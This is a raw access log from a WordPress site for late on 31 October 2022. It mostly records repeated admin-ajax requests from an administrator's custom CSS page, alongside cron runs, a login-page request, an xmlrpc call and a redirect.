80.62.117.254 - - [31/Oct/2022:23:36:10 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 1110 "https://talmedos.com/wp-admin/themes.php?page=simple-custom-css.php" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
46.101.144.32 - - [31/Oct/2022:23:38:11 +0000] "POST /wp-cron.php?doing_wp_cron=1667259491.2950479984283447265625 HTTP/1.1" 200 3977 "https://talmedos.com/wp-cron.php?doing_wp_cron=1667259491.2950479984283447265625" "WordPress/6.0.3; https://talmedos.com"
80.62.117.254 - - [31/Oct/2022:23:38:11 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 1110 "https://talmedos.com/wp-admin/themes.php?page=simple-custom-css.php" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
45.61.188.188 - - [31/Oct/2022:23:38:20 +0000] "GET /wp-login.php HTTP/1.1" 200 11285 "-" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36"
45.61.188.188 - - [31/Oct/2022:23:38:20 +0000] "POST /wp-login.php HTTP/1.1" 200 8599 "-" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36"
80.62.117.254 - - [31/Oct/2022:23:38:31 +0000] "-" 408 3741 "-" "-"
80.62.117.254 - - [31/Oct/2022:23:40:15 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 1110 "https://talmedos.com/wp-admin/themes.php?page=simple-custom-css.php" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
80.62.117.254 - - [31/Oct/2022:23:42:15 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 1110 "https://talmedos.com/wp-admin/themes.php?page=simple-custom-css.php" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
80.62.117.254 - - [31/Oct/2022:23:44:16 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 1110 "https://talmedos.com/wp-admin/themes.php?page=simple-custom-css.php" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
80.62.117.254 - - [31/Oct/2022:23:46:17 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 1110 "https://talmedos.com/wp-admin/themes.php?page=simple-custom-css.php" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
35.194.233.240 - - [31/Oct/2022:23:46:47 +0000] "POST /xmlrpc.php HTTP/1.1" 200 3588 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96"
80.62.117.254 - - [31/Oct/2022:23:48:18 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 1110 "https://talmedos.com/wp-admin/themes.php?page=simple-custom-css.php" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
80.62.117.254 - - [31/Oct/2022:23:50:18 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 1110 "https://talmedos.com/wp-admin/themes.php?page=simple-custom-css.php" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
154.89.5.110 - - [31/Oct/2022:23:51:03 +0000] "GET / HTTP/1.0" 301 3957 "-" "-"
80.62.117.254 - - [31/Oct/2022:23:52:19 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 1110 "https://talmedos.com/wp-admin/themes.php?page=simple-custom-css.php" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
80.62.117.254 - - [31/Oct/2022:23:54:20 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 1110 "https://talmedos.com/wp-admin/themes.php?page=simple-custom-css.php" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
80.62.117.254 - - [31/Oct/2022:23:56:20 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 1110 "https://talmedos.com/wp-admin/themes.php?page=simple-custom-css.php" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
80.62.117.254 - - [31/Oct/2022:23:58:21 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 1110 "https://talmedos.com/wp-admin/themes.php?page=simple-custom-css.php" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
